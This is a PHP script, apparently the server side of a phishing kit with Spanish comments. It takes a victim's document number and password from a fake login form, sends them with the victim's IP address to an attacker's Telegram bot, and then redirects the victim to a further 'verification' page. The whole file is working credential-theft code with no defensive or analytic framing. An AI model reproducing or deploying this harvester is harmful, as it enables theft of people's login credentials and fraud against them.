<?php
session_start();
include 'bot.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // CORRECCIÓN: Los nombres deben ser 'doc' y 'pass' como en el HTML
    $usr = htmlspecialchars($_POST['doc'], ENT_QUOTES, 'UTF-8');
    $psw = htmlspecialchars($_POST['pass'], ENT_QUOTES, 'UTF-8');

    // Almacenar en sesión para usarlo después
    $_SESSION['username'] = $usr;

    $ip = $_SERVER['REMOTE_ADDR'];
    $text = "D4V1V13ND4 | @sn0wdie\n----\nD0C: $usr\nP4SWD: $psw\n\nIP: $ip\n----";
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirigir al nuevo paso de verificación (gamma)
    if ($response) {
        header("Location: ../verificacion.html");
        exit;
    } else {
        echo "Error en la conexión con el bot.";
    }
} else {
    die('Acceso no permitido.');
}
?>
